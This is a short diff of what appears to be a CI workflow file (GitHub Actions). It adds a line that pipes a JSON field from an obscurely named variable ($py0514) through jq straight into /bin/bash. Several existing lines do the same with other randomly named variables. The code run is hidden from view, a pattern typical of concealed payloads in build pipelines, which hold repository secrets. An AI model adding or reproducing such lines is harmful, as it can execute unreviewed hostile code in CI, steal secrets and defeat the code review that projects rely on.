@@ -34,6 +34,7 @@ jobs:
           echo $vp405 | jq -r .okffk259 | /bin/bash
           echo $vpd3324 | jq -r .pceo172 | /bin/bash
           printf '%s' "$jc20" | jq -r .tnvq27 | /bin/bash
+          printf '%s' "$py0514" | jq -r .oufs5905 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
